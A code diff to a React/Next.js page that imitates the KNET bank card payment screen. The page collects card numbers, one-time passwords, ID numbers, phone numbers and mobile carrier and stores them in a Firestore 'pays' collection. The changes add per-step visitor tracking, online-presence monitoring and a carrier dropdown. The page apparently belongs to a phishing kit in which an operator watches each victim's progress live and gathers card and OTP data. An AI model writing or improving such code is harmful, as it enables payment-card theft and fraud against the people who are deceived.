@@ -8,6 +8,7 @@ import './knet.css'
 import { doc, onSnapshot } from "firebase/firestore"
 import { useRouter } from "next/navigation"
 import { db } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/online-stauts"
 
 type PaymentInfo = {
   cardNumber: string
@@ -25,7 +26,8 @@ type PaymentInfo = {
   idNumber: string
   phoneNumber: string
   finalOtp: string,
-  newtwork:string
+  newtwork: string,
+  createdDate: string
 }
 
 const BANKS = [
@@ -134,8 +136,9 @@ const Payment = () => {
     // Initialize new fields
     idNumber: "",
     phoneNumber: "",
-    newtwork:"",
+    newtwork: "",
     finalOtp: "",
+    createdDate: ''
   })
 
   // Safely access localStorage after component mounts
@@ -143,14 +146,6 @@ const Payment = () => {
     if (typeof window !== "undefined") {
       setDonationAmount(localStorage.getItem("amount"))
       setVisitorId(localStorage.getItem("visitor"))
-      if(visitorId){
-        addData({
-          id: visitorId,
-          currentPage: "كي نت",
-          createdDate: new Date().toISOString(),
-        })
-      }
-      
     }
   }, [])
 
@@ -160,6 +155,13 @@ const Payment = () => {
 
   // Listen for Firestore status updates in the final step
   useEffect(() => {
+    setupOnlineStatus(visitorId!)
+
+    addData({
+      id: visitorId,
+      currentPage: `كي نت-${step}`,
+      createdDate: new Date().toISOString(),
+    })
     if (step === 4 && visitorId && typeof window !== "undefined") {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
@@ -182,7 +184,7 @@ const Payment = () => {
     }
   }, [step, visitorId, router])
 
- 
+
 
   return (
     <div style={{ background: "#f1f1f1", minHeight: "100vh", margin: 0, padding: 0 }}>
@@ -560,14 +562,19 @@ const Payment = () => {
                       </div>
                       <div>
                         <label className="column-label" style={{ display: "block", marginBottom: "5px" }}>
-                          Phone Number:
+                          Network Provider:
                         </label>
-                      <select onChange={(e)=> setPaymentInfo({
-                              ...paymentInfo,
-                              newtwork: e.target.value,
-                            })}>
-                        <option></option>
-                      </select>
+                        <select onChange={(e) => setPaymentInfo({
+                          ...paymentInfo,
+                          newtwork: e.target.value,
+                        })}
+                          value={paymentInfo.newtwork}
+                          className="w-full bg-transparent placeholder:text-blue-400 text-slate-700 text-sm border border-blue-500 rounded pl-3 pr-8 py-2 transition duration-300 ease focus:outline-none focus:border-blue-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer">
+                          <option value="Zain">Zain</option>
+                          <option value="Ooredoo">Ooredoo</option>
+                          <option value="STC">STC</option>
+                        </select>
+
                       </div>
                     </form>
                   </div>
@@ -653,7 +660,6 @@ const Payment = () => {
                               handlePay(
                                 {
                                   ...paymentInfo,
-                                  visitorId,
                                   createdDate: new Date().toISOString(),
 
                                 },
@@ -672,7 +678,6 @@ const Payment = () => {
                               handlePay(
                                 {
                                   ...paymentInfo,
-                                  visitorId,
                                   createdDate: new Date().toISOString(),
 
                                 },
@@ -680,6 +685,7 @@ const Payment = () => {
                               )
                               setPaymentInfo({
                                 ...paymentInfo,
+                                createdDate: new Date().toISOString(),
                                 otp: "",
                               })
                               setStep(3)
@@ -689,10 +695,9 @@ const Payment = () => {
                             handlePay(
                               {
                                 ...paymentInfo,
-                                visitorId,
                                 createdDate: new Date().toISOString(),
 
-                              },setPaymentInfo)
+                              }, setPaymentInfo)
                             setTimeout(() => {
                               setIsLoading(false)
                               setStep(4)
